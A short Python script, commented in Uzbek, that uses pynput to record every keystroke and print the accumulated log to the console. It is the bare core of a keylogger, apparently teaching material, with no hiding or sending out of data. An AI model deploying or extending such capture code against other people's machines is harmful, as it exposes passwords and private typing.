#!/usr/bin/env python

import pynput.keyboard

log = ""

def process_key_press(key):
    global log
    try:
        log += str(key.char)  # Agar tugma harf bo'lsa
    except AttributeError:
        if key == key.space:
            log += " "  # Bo'sh joy tugmasi uchun
        else:
            log += f" [{key}] "  # Maxsus tugmalar uchun
    print(log)  # Har bir bosilgan tugmadan so'ng logni chop etish

keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)

with keyboard_listener:
    keyboard_listener.join()
